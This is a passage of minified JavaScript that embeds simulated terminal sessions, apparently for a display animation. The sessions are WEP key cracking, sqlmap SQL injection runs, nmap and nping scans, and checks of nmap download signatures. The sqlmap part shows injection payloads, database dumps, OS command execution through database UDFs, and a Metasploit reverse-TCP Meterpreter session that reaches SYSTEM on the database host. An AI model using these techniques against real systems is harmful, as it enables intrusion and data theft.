IP=(192.168.1.123)\n[13:51:40] Sending arp request for: 192.168.1.200\n[13:51:40] Got arp reply from (00:D0:CF:03:34:8C)\n[13:52:25] WEP=000009991 (next crack at 10000) IV=60:62:02 (rate=115)            \n[13:52:36] WEP=000012839 (next crack at 20000) IV=21:68:02 (rate=204)            \n[13:52:25] Starting crack PID=2413\n[13:52:27] WEP=000010324 (next crack at 20000) IV=0d:63:02 (rate=183)            \n[13:54:03] Starting crack PID=2415\n[13:53:28] WEP=000023769 (next crack at 30000) IV=79:32:00 (rate=252)            \n[13:53:11] Starting crack PID=2414\n[13:53:13] WEP=000020320 (next crack at 30000) IV=7d:2b:00 (rate=158)            \n[13:54:21] WEP=000034005 (next crack at 40000) IV=53:47:00 (rate=244)            \n\n                            [328385:55:08] Tested 5/70000 keys\n\nKB    depth   byte(vote)\n0    0/  1   01( 206) 3B( 198) 5F( 190) 77( 188) 3D( 187) D2( 187) 60( 186) 6F( 186) A1( 185) 48( 184) \n1    0/  1   23( 232) 82( 190) BF( 187) 4E( 184) 0D( 183) 90( 181) B9( 181) 08( 180) 1A( 180) 8A( 180) \n2    0/  1   45( 200) F0( 186) 52( 184) AE( 184) 75( 183) 48( 181) A1( 180) 71( 179) DE( 179) 21( 178) \n3    0/  1   67( 221) AE( 202) B2( 193) 14( 191) 51( 184) 6D( 184) 64( 183) 65( 183) 5B( 182) 17( 181) \n4    0/  5   89( 182) DB( 182) 74( 181) C2( 181) CC( 181) 64( 180) CD( 180) 5F( 179) A6( 179) 1A( 178) \n\nKey: 01:23:45:67:89\n\n[13:54:51] WEP=000040387 (next crack at 50000) IV=0d:a0:02 (rate=180)            \n[13:55:08] WEP=000043621 (next crack at 50000) IV=da:5a:00 (rate=136)            \n[13:55:08] Stopping crack PID=2416\n[13:55:08] KEY=(01:23:45:67:89)\n\nOwned in 3.60 minutes\n\n[13:55:08] Dying...\n')},get dt(){return delete this.dt,this.dt=777}}]}},{numCols:91,get streams(){return[{get title(){delete this.title;return this.title=x(["sqlmap","terminal - sqlmap"])},get stream(){return delete this.stream,this.stream=E("$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1\" --os-cmd id -\n\nweb application technology: PHP 5.2.6, Apache 2.2.9\nback-end DBMS: PostgreSQL\n[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system\n[hh:mm:12] [INFO] the back-end DBMS operating system is Linux\n[hh:mm:12] [INFO] testing if current user is DBA\n[hh:mm:12] [INFO] detecting back-end DBMS version from its banner\n[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist\n[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist\n[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file\n[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file\ndo you want to retrieve the command standard output? [Y/n/a] y\ncommand standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post\ngres)'\n\n[hh:mm:19] [INFO] cleaning up the database management system\ndo you want to remove UDF 'sys_eval'? [Y/n] y\ndo you want to remove UDF 'sys_exec'? [Y/n] y\n[hh:mm:23] [INFO] database management system cleanup finished\n[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can on\n\n$ python sqlmap.py -u \"http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1\" --os-\n[hh:mm:31] [INFO] the back-end DBMS is MySQL\nweb server operating system: Windows 2003\nweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0\nback-end DBMS: MySQL 5.0\n[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system\n[hh:mm:31] [INFO] the back-end DBMS operating system is Windows\nhow do you want to establish the tunnel?\n[1] TCP: Metasploit Framework (default)\n[2] ICMP: icmpsh - ICMP tunneling\n> \n[hh:mm:32] [INFO] testing if current user is DBA\n[hh:mm:32] [INFO] fetching current user\nwhat is the back-end database management system architecture?\n[1] 32-bit (default)\n[2] 64-bit\n> \n[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist\n[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist\n[hh:mm:33] [INFO] detecting back-end DBMS version from its banner\n[hh:mm:33] [INFO] retrieving MySQL base directory absolute path\n[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file\n[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file\nhow do you want to execute the Metasploit shellcode on the back-end database underlying op\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)\n[2] Stand-alone payload stager (file system way)\n> \n[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode \nwhich connection type do you want to use?\n[1] Reverse TCP: Connect back from the database host to this machine (default)\n[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports \nbetween the specified and 65535\n[3] Bind TCP: Listen on the database host for a connection\n> \nwhich is the local address? [192.168.136.1] \nwhich local port number do you want to use? [60641] \nwhich payload do you want to use?\n[1] Meterpreter (default)\n[2] Shell\n[3] VNC\n> \n[hh:mm:40] [INFO] creation in progress ... done\n[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait\n       _\n                                | |      o\n_  _  _    _ _|_  __,   ,    _  | |  __    _|_\n/ |/ |/ |  |/  |  /  |  / \\_|/ \\_|/  /  \\_|  |\n|  |  |_/|__/|_/\\_/|_/ \\/ |__/ |__/\\__/ |_/|_/\n                        /|\n                        \\|\n\n    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]\n+ -- --=[ 674 exploits - 351 auxiliary\n+ -- --=[ 217 payloads - 27 encoders - 8 nops\n    =[ svn r12272 updated 4 days ago (2011.04.07)\n\nPAYLOAD => windows/meterpreter/reverse_tcp\nEXITFUNC => thread\nLPORT => 60641\nLHOST => 192.168.136.1\n[*] Started reverse handler on 192.168.136.1:60641 \n[*] Starting the payload handler...\n[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b\nineval', please wait..\n[*] Sending stage (749056 bytes) to 192.168.136.129\n[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a\nt Mon Apr 11 hh:mm:52 +0100 2011\n\nmeterpreter > Loading extension espia...success.\nmeterpreter > Loading extension incognito...success.\nmeterpreter > [-] The 'priv' extension has already been loaded.\nmeterpreter > Loading extension sniffer...success.\nmeterpreter > System Language : en_US\nOS              : Windows .NET Server (Build 3790, Service Pack 2).\nComputer        : W2K3R2\nArchitecture    : x86\nMeterpreter     : x86/win32\nmeterpreter > Server username: NT AUTHORITY\\SYSTEM\nmeterpreter > ipconfig\n\nMS TCP Loopback interface\nHardware MAC: 00:00:00:00:00:00\nIP Address  : 127.0.0.1\nNetmask     : 255.0.0.0\n\nIntel(R) PRO/1000 MT Network Connection\nHardware MAC: 00:0c:29:fc:79:39\nIP Address  : 192.168.136.129\nNetmask     : 255.255.255.0\n\nmeterpreter > exit\n\n[*] Meterpreter session 1 closed.  Reason: User exit\n\n$ python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZCI6IDF9 -v \n[23:43:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[23:43:35] [PAYLOAD] KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAx\nfScgRUxTRSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp\n[23:43:35] [TRAFFIC OUT] HTTP request [#11]:\nGET /?value=KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAxfScgRUxTR\nSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp HTTP/1.1\nHost: localhost\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.4.3#dev (http://sqlmap.org)\nConnection: close\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/\" --batch --crawl=3\n[xx:xx:53] [INFO] starting crawler\n[xx:xx:53] [INFO] searching for links with depth 1\n[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while\n[xx:xx:53] [INFO] searching for links with depth 2\n[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'\n[xx:xx:00] [INFO] 42/56 links visited (75%)\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1\" -b --et\n[hh:mm:01] [INFO] the back-end DBMS is Oracle\n[hh:mm:01] [INFO] fetching banner\n[hh:mm:01] [INFO] retrieving the length of query output\n[hh:mm:01] [INFO] retrieved: 64\n17% [========>                                          ] 11/64  ETA 00:19\n\n$ python sqlmap.py --purge -v 3\n[xx:xx:55] [INFO] purging content of directory '/home/testuser/.local/share/sqlmap'...\n[xx:xx:55] [DEBUG] changing file attributes\n[xx:xx:55] [DEBUG] writing random data to files\n[xx:xx:55] [DEBUG] truncating files\n[xx:xx:55] [DEBUG] renaming filenames to random values\n[xx:xx:55] [DEBUG] renaming directory names to random values\n[xx:xx:55] [DEBUG] deleting the whole directory tree\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&use\\\nr=foo&id=1\" --batch --smart\n[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic\n[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic\n[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might \nnot be injectable\n[xx:xx:14] [INFO] skipping GET parameter 'ca'\n[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic\n[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic\n[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' migh\nt not be injectable\n[xx:xx:14] [INFO] skipping GET parameter 'user'\n[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic\n[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic\n[xx:xx:14] [INFO] GET parameter 'id' is dynamic\n[xx:xx:14] [WARNING] reflective value(s) found and filtering out\n[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be \ninjectable (possible DBMS: 'MySQL')\n[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'\nheuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you \nwant to skip test payloads specific for other DBMSes? [Y/n] Y\ndo you want to include all tests for 'MySQL' extending provided level (1) and ri\nsk (1)? [Y/n] Y\n[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVI\nNG clause' injectable \n[xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause\n'\n[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or\n HAVING clause' injectable \n[xx:xx:14] [INFO] testing 'MySQL inline queries'\n[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'\n[xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'\n[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'\n[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in\njectable \n[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'\n[xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn\nique tests as there is at least one other potential injection technique found\n[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the \ntime needed to find the right number of query columns. Automatically extending t\nhe range for current UNION query injection technique test\n[xx:xx:24] [INFO] target URL appears to have 3 columns in query\n[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 colu\nmns' injectable\n\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1\" --b\\\natch --test-filter=ROW\n[xx:xx:39] [INFO] GET parameter 'id' is dynamic\n[xx:xx:39] [WARNING] reflective value(s) found and filtering out\n[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be \ninjectable (possible DBMS: 'MySQL')\n[xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'\n[xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause\n'\n[xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or\n HAVING clause' injectable \nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any\n)? [y/N] N\nsqlmap identified the following injection points with a total of 3 HTTP(s) reque\nsts:\n---\nPlace: GET\nParameter: id\n    Type: error-based\n    Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause\n    Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC\nT (C\n    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO\nM (S\n    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY \nx)\n---\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --hostname\n\n[xx:xx:04] [INFO] fetching server hostname\n[xx:xx:04] [INFO] retrieved: debian-5.0-i386\nhostname:    'debian-5.0-i386'\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1\" -\\\n-columns -D testdb -T users -C name\nDatabase: SQLite_masterdb\nTable: users\n[3 columns]\n+---------+---------+\n| Column  | Type    |\n+---------+---------+\n| id      | INTEGER |\n| name    | TEXT    |\n| surname | TEXT    |\n+---------+---------+\n\n$ python sqlmap.py -u \"http://192.168.48.130/sqlmap/mysql/get_int.php?id=1\" --s\\\nchema--batch --exclude-sysdbs\n\nDatabase: owasp10\nTable: accounts\n[4 columns]\n+-------------+---------+\n| Column      | Type    |\n+-------------+---------+\n| cid         | int(11) |\n| mysignature | text    |\n| password    | text    |\n| username    | text    |\n+-------------+---------+\n\nDatabase: owasp10\nTable: blogs_table\n[4 columns]\n+--------------+----------+\n| Column       | Type     |\n+--------------+----------+\n| date         | datetime |\n| blogger_name | text     |\n| cid          | int(11)  |\n| comment      | text     |\n+--------------+----------+\n\nDatabase: owasp10\nTable: hitlog\n[6 columns]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| date     | datetime |\n| browser  | text     |\n| cid      | int(11)  |\n| hostname | text     |\n| ip       | text     |\n| referer  | text     |\n+----------+----------+\n\nDatabase: testdb\nTable: users\n[3 columns]\n+---------+---------------+\n| Column  | Type          |\n+---------+---------------+\n| id      | int(11)       |\n| name    | varchar(500)  |\n| surname | varchar(1000) |\n+---------+---------------+\n\n$ python sqlmap.py -u \"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1\"--count -D \n\nDatabase: testdb\n+----------------+---------+\n| Table          | Entries |\n+----------------+---------+\n| dbo.users      | 4       |\n| dbo.users_blob | 2       |\n+----------------+---------+\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1\"\\--dump -T \n\nDatabase: Firebird_masterdb\nTable: USERS\n[4 entries]\n+----+--------+------------+\n| ID | NAME   | SURNAME    |\n+----+--------+------------+\n| 1  | luther | blisset    |\n| 2  | fluffy | bunny      |\n| 3  | wu     | ming       |\n| 4  | NULL   | nameisnull |\n+----+--------+------------+\n\n")},get dt(){return delete this.dt,this.dt=637}}]}},{numCols:81,get streams(){return[{get title(){delete this.title;return this.title=x(["nmap","terminal - nmap","terminal - nping"])},get stream(){return delete this.stream,this.stream=E("# nping -c 1 --tcp -p 80,433 scanme.nmap.org google.com\n\nStarting Nping ( https://nmap.org/nping )\nSENT (0.0120s) TCP 96.16.226.135:50091 > 64.13.134.52:80 S ttl=64 id=52072 iplen\nRCVD (0.1810s) TCP 64.13.134.52:80 > 96.16.226.135:50091 SA ttl=53 id=0 iplen=44\nSENT (1.0140s) TCP 96.16.226.135:50091 > 74.125.45.100:80 S ttl=64 id=13932 iple\nRCVD (1.1370s) TCP 74.125.45.100:80 > 96.16.226.135:50091 SA ttl=52 id=52913 ipl\nSENT (2.0140s) TCP 96.16.226.135:50091 > 64.13.134.52:433 S ttl=64 id=8373 iplen\nSENT (3.0140s) TCP 96.16.226.135:50091 > 74.125.45.100:433 S ttl=64 id=23624 ipl\n\nStatistics for host scanme.nmap.org (64.13.134.52):\n |  Probes Sent: 2 | Rcvd: 1 | Lost: 1  (50.00%)\n |_ Max rtt: 169.720ms | Min rtt: 169.720ms | Avg rtt: 169.720ms\nStatistics for host google.com (74.125.45.100):\n |  Probes Sent: 2 | Rcvd: 1 | Lost: 1  (50.00%)\n |_ Max rtt: 122.686ms | Min rtt: 122.686ms | Avg rtt: 122.686ms\nRaw packets sent: 4 (160B) | Rcvd: 2 (92B) | Lost: 2 (50.00%)\nTx time: 3.00296s | Tx bytes/s: 53.28 | Tx pkts/s: 1.33\nRx time: 3.00296s | Rx bytes/s: 30.64 | Rx pkts/s: 0.67\nNping done: 2 IP addresses pinged in 4.01 seconds\n\n# nping --tcp -c 2 1.1.1.1 -p 100-102\n\nStarting Nping ( https://nmap.org/nping )\nSENT (0.0210s) TCP 192.168.1.77 > 1.1.1.1:100\nSENT (1.0230s) TCP 192.168.1.77 > 1.1.1.1:101\nSENT (2.0250s) TCP 192.168.1.77 > 1.1.1.1:102\nSENT (3.0280s) TCP 192.168.1.77 > 1.1.1.1:100\nSENT (4.0300s) TCP 192.168.1.77 > 1.1.1.1:101\nSENT (5.0320s) TCP 192.168.1.77 > 1.1.1.1:102\n\n# nping --tcp -c 2 1.1.1.1 2.2.2.2 3.3.3.3 -p 8080\n\nStarting Nping ( https://nmap.org/nping )\nSENT (0.0230s) TCP 192.168.0.21 > 1.1.1.1:8080\nSENT (1.0240s) TCP 192.168.0.21 > 2.2.2.2:8080\nSENT (2.0260s) TCP 192.168.0.21 > 3.3.3.3:8080\nSENT (3.0270s) TCP 192.168.0.21 > 1.1.1.1:8080\nSENT (4.0290s) TCP 192.168.0.21 > 2.2.2.2:8080\nSENT (5.0310s) TCP 192.168.0.21 > 3.3.3.3:8080\n\n# nping --tcp -c 1 --delay 500ms 1.1.1.1 2.2.2.2 3.3.3.3 -p 137-139\n\nStarting Nping ( https://nmap.org/nping )\nSENT (0.0230s) TCP 192.168.0.21 > 1.1.1.1:137\nSENT (0.5250s) TCP 192.168.0.21 > 2.2.2.2:137\nSENT (1.0250s) TCP 192.168.0.21 > 3.3.3.3:137\nSENT (1.5280s) TCP 192.168.0.21 > 1.1.1.1:138\nSENT (2.0280s) TCP 192.168.0.21 > 2.2.2.2:138\nSENT (2.5310s) TCP 192.168.0.21 > 3.3.3.3:138\nSENT (3.0300s) TCP 192.168.0.21 > 1.1.1.1:139\nSENT (3.5330s) TCP 192.168.0.21 > 2.2.2.2:139\nSENT (4.0330s) TCP 192.168.0.21 > 3.3.3.3:139\n\n# nping --echo-client \"public\" echo.nmap.org --udp \n\nStarting Nping ( https://nmap.org/nping )\nSENT (1.0970s) UDP 10.1.20.128:53 > 178.79.165.17:40125 ttl=64 id=32523 iplen=28\nCAPT (1.1270s) UDP 80.38.10.21:45657 > 178.79.165.17:40125 ttl=54 id=32523 iplen\nRCVD (1.1570s) ICMP 178.79.165.17 > 10.1.20.128 Port unreachable (type=3/code=3)\n[...]\nSENT (5.1020s) UDP 10.1.20.128:53 > 178.79.165.17:40125 ttl=64 id=32523 iplen=28\nCAPT (5.1335s) UDP 80.38.10.21:45657 > 178.79.165.17:40125 ttl=54 id=32523 iplen\nRCVD (5.1600s) ICMP 178.79.165.17 > 10.1.20.128 Port unreachable (type=3/code=3)\n\nMax rtt: 60.628ms | Min rtt: 58.378ms | Avg rtt: 59.389ms\nRaw packets sent: 5 (140B) | Rcvd: 5 (280B) | Lost: 0 (0.00%)| Echoed: 5 (140B) \nTx time: 4.00459s | Tx bytes/s: 34.96 | Tx pkts/s: 1.25\nRx time: 5.00629s | Rx bytes/s: 55.93 | Rx pkts/s: 1.00\nNping done: 1 IP address pinged in 6.18 seconds\n\n# nping --echo-client \"public\" echo.nmap.org --tcp -p80\n\nStarting Nping ( https://nmap.org/nping )\nSENT (1.2160s) TCP 10.0.1.77:41659 > 178.79.165.17:80 S ttl=64 id=3317 iplen=40 \nRCVD (1.2180s) TCP 178.79.165.17:80 > 10.0.1.77:41659 SA ttl=128 id=13177 iplen=\nSENT (2.2150s) TCP 10.0.1.77:41659 > 178.79.165.17:80 S ttl=64 id=3317 iplen=40 \nSENT (3.2180s) TCP 10.0.1.77:41659 > 178.79.165.17:80 S ttl=64 id=3317 iplen=40 \nSENT (4.2190s) TCP 10.0.1.77:41659 > 178.79.165.17:80 S ttl=64 id=3317 iplen=40 \nSENT (5.2200s) TCP 10.0.1.77:41659 > 178.79.165.17:80 S ttl=64 id=3317 iplen=40 \n\nMax rtt: 2.062ms | Min rtt: 2.062ms | Avg rtt: 2.062ms\nRaw packets sent: 5 (200B) | Rcvd: 1 (46B) | Lost: 4 (80.00%)| Echoed: 0 (0B) \nTx time: 4.00504s | Tx bytes/s: 49.94 | Tx pkts/s: 1.25\nRx time: 5.00618s | Rx bytes/s: 9.19 | Rx pkts/s: 0.20\nNping done: 1 IP address pinged in 6.39 seconds\n\n# nmap -A -T4 scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for scanme.nmap.org (64.13.134.52)\nHost is up (0.034s latency).\nNot shown: 994 filtered ports\nPORT      STATE  SERVICE VERSION\n22/tcp    open   ssh     OpenSSH 4.3 (protocol 2.0)\n| ssh-hostkey: 1024 60:ac:4d:51:b1:cd:85:09:12:16:92:76:1d:5d:27:6e (DSA)\n|_2048 2c:22:75:60:4b:c3:3b:18:a2:97:2c:96:7e:28:dc:dd (RSA)\n53/tcp    open   domain\n70/tcp    closed gopher\n80/tcp    open   http    Apache httpd 2.2.3 ((CentOS))\n| http-methods: Potentially risky methods: TRACE\n|_See http://nmap.org/nsedoc/scripts/http-methods.html\n|_html-title: Go ahead and ScanMe!\n113/tcp   closed auth\n31337/tcp closed Elite\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS details: Linux 2.6.18 (CentOS 5.4)\nNetwork Distance: 10 hops\n\nTRACEROUTE (using port 113/tcp)\nHOP RTT      ADDRESS\n[Cut first eight hops for brevity]\n9   20.29 ms xe6-2.core1.svk.layer42.net (69.36.239.221)\n10  19.58 ms scanme.nmap.org (64.13.134.52)\n\nNmap done: 1 IP address (1 host up) scanned in 25.97 seconds\n\n# nmap -sL 6.209.24.0/24 6.207.0.0/22\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for 6.209.24.0\nNmap scan report for fw.corp.avataronline.com (6.209.24.1)\nNmap scan report for dev2.corp.avataronline.com (6.209.24.2)\nNmap scan report for 6.209.24.3\nNmap scan report for 6.209.24.4\nNmap scan report for dhcp-21.corp.avataronline.com (6.209.24.21)\nNmap scan report for dhcp-22.corp.avataronline.com (6.209.24.22)\nNmap scan report for dhcp-23.corp.avataronline.com (6.209.24.23)\nNmap scan report for 6.207.0.0\nNmap scan report for gw.avataronline.com (6.207.0.1)\nNmap scan report for ns1.avataronline.com (6.207.0.2)\nNmap scan report for ns2.avataronline.com (6.207.0.3)\nNmap scan report for ftp.avataronline.com (6.207.0.4)\nNmap scan report for 6.207.0.5\nNmap scan report for 6.207.0.6\nNmap scan report for www.avataronline.com (6.207.0.7)\nNmap scan report for 6.207.0.8\nNmap scan report for cluster-c120.avataronline.com (6.207.2.120)\nNmap scan report for cluster-c121.avataronline.com (6.207.2.121)\nNmap scan report for cluster-c122.avataronline.com (6.207.2.122)\nNmap scan report for 6.207.3.255\nNmap done: 1280 IP addresses (0 hosts up) scanned in 331.49 seconds\n\nNmap scan report for fw.corp.avataronline.com (6.209.24.1)\n(The 65530 ports scanned but not shown below are in state: filtered)\nPORT     STATE  SERVICE    VERSION\n22/tcp   open   ssh        OpenSSH 3.7.1p2 (protocol 1.99)\n| ssh-hostkey: 1024 7c:14:2f:92:ca:61:90:a4:11:3c:47:82:d5:8e:a9:6b (DSA)\n|_2048 41:cf7d:839d:7f66:0ae1:8331:7fd4:5a97:5a (RSA)\n|_sshv1: Server supports SSHv1\n53/tcp   open   domain     ISC BIND 9.2.1\n110/tcp  open   pop3       Courier pop3d\n113/tcp  closed auth\n143/tcp  open   imap       Courier Imap 1.6.X - 1.7.X\n3128/tcp open   http-proxy Squid webproxy 2.2.STABLE5\nDevice type: general purpose\nRunning: Linux 2.4.X|2.5.X\nOS details: Linux Kernel 2.4.0 - 2.5.20\nUptime 3.134 days\n\nNmap scan report for dhcp-23.corp.avataronline.com (6.209.24.23)\n(The 65526 ports scanned but not shown below are in state: closed)\nPORT      STATE    SERVICE       VERSION\n135/tcp   filtered msrpc\n136/tcp   filtered profile\n137/tcp   filtered netbios-ns\n138/tcp   filtered netbios-dgm\n139/tcp   filtered netbios-ssn\n445/tcp   open     microsoft-ds  Microsoft Windows XP microsoft-ds\n1002/tcp  open     windows-icfw?\n1025/tcp  open     msrpc         Microsoft Windows msrpc\n16552/tcp open     unknown\nDevice type: general purpose\nRunning: Microsoft Windows NT/2K/XP\nOS details: Microsoft Windows XP Professional RC1+ through final release\n\nHost script results:\n|_nbstat: NetBIOS name: TRACYD, NetBIOS user: <unknown>,  NetBIOS MAC: 00:20:35:\n|_smbv2-enabled: Server doesn't support SMBv2 protocol\n| smb-os-discovery:  \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|_  Name: WORKGROUP\\JOHND\n\n# nmap-diff.pl -c3\n\n5 IPs showed changes\n\n10.12.4.8 (ftp-box.foocompany.biz)\n     21/tcp   open   ftp\n     80/tcp   open   http\n    443/tcp   open   https\n   1027/tcp   open   IIS\n + 1029/tcp   open   ms-lsa\n  38292/tcp   open   landesk-cba \nOS: Microsoft Windows Millennium Edition (Me)\n  Windows 2000 Professional or Advanced Server\n  or Windows XP\n\n10.16.234.3 (media.foocompany.biz)\n     80/tcp   open   http\n +  554/tcp   open   rtsp\n + 7070/tcp   open   realserver\n\n192.168.10.186 (testbox.foocompany.biz)\n+ 8082/tcp   open   blackice-alerts\nOS: Linux Kernel 2.4.0 - 2.5.20\n\n172.24.12.58 (mtafoocompany.biz)\n+   25/tcp   open   smtp \nOS: FreeBSD 4.3 - 4.4PRERELEASE\n\n172.23.76.22 (media2.foocorp.biz)\n     80/tcp   open   http\n   1027/tcp   open   IIS\n + 1040/tcp   open   netsaint\n   1755/tcp   open   wms \n   3372/tcp   open   msdtc\n   6666/tcp   open   irc-serv\n   7007/tcp   open   afs3-bos\nOS: Microsoft Windows Millennium Edition (Me)\n  Windows 2000 Professional or Advanced Server\n  or Windows XP\n\n# nmap-report -p21 -rV\n[...]\n172.21.199.76 (ftp1.foocorp.biz)\n    21/tcp   open   ssl|ftp Serv-U ftpd 4.0\n\n192.168.12.56 (ftp2.foocorp.biz)\n    21/tcp   open   ftp     NcFTPd\n\n192.168.13.130 (dropbox.foocorp.biz)\n    21/tcp   open   ftp     WU-FTPD 6.00LS\n\nflog~> gpg --fingerprint nmap fyodor\npub 1024D/33599B5F 2005-04-24\n    Key fingerprint = BB61 D057 C0D7 DCEF E730 996C 1AF6 EC50 3359 9B5F\nuid                Fyodor <fyodor@insecure.org>\nsub 2048g/D3C2241C 2005-04-24\n\npub 1024D/6B9355D0 2005-04-24\n    Key fingerprint = 436D 66AB 9A79 8425 FDA0 E3F8 01AF 9F03 6B93 55D0\nuid                Nmap Project Signing Key (http://insecure.org/)\nsub 2048g/A50A6A94 2005-04-24\n\nflog> cat sigs/nmap-4.76.tgz.digest.txt \nnmap-4.76.tgz:    MD5 = 54 B5 C9 E3 F4 4C 1A DD  E1 7D F6 81 70 EB 7C FE\nnmap-4.76.tgz:   SHA1 = 4374 CF9C A882 2C28 5DE9  D00E 8F67 06D0 BCFA A403\nnmap-4.76.tgz: RMD160 = AE7B 80EF 4CE6 DBAA 6E65  76F9 CA38 4A22 3B89 BD3A\nnmap-4.76.tgz: SHA224 = 524D479E 717D98D0 2FB0A42B 9A4E6E52 4027C9B6 1D843F95\n                        D419F87F\nnmap-4.76.tgz: SHA256 = 0E960E05 53EB7647 0C8517A0 038092A3 969DB65C BE23C03F\n                        D6DAEF1A CDCC9658\nnmap-4.76.tgz: SHA384 = D52917FD 9EE6EE62 F5F456BF E245675D B6EEEBC5 0A287B27\n                        3CAA4F50 B171DC23 FE7808A8 C5E3A49A 4A78ACBE A5AEED33\nnmap-4.76.tgz: SHA512 = 826CD89F 7930A765 C9FE9B41 1DAFD113 2C883857 2A3A9503\n                        E4C1E690 20A37FC8 37564DC3 45FF0C97 EF45ABE6 6CEA49FF\n                        E262B403 A52F4ECE C23333A0 48DEDA66\n\nflog> gpg --print-md sha256 nmap-4.76.tgz \nnmap-4.76.tgz: 0E960E05 53EB7647 0C8517A0 038092A3 969DB65C BE23C03F D6DAEF1A\n               CDCC9658\nflog> sha1sum nmap-4.76.tgz \n4374cf9ca8822c285de9d00e8f6706d0bcfaa403  nmap-4.76.tgz\nflog> md5sum nmap-4.76.tgz\n54b5c9e3f44c1adde17df68170eb7cfe  nmap-4.76.tgz\n\n# rpm -vhU https://nmap.org/dist/nmap-4.68-1.i386.rpm\nRetrieving https://nmap.org/dist/nmap-4.68-1.i386.rpm\nPreparing...                ########################################### [100%]\n   1:nmap                   ########################################### [100%]\n# rpm -vhU https://nmap.org/dist/zenmap-4.68-1.noarch.rpm\nRetrieving https://nmap.org/dist/zenmap-4.68-1.noarch.rpm\nPreparing...                ########################################### [100%]\n   1:zenmap                 ########################################### [100%]\n\n> rpmbuild 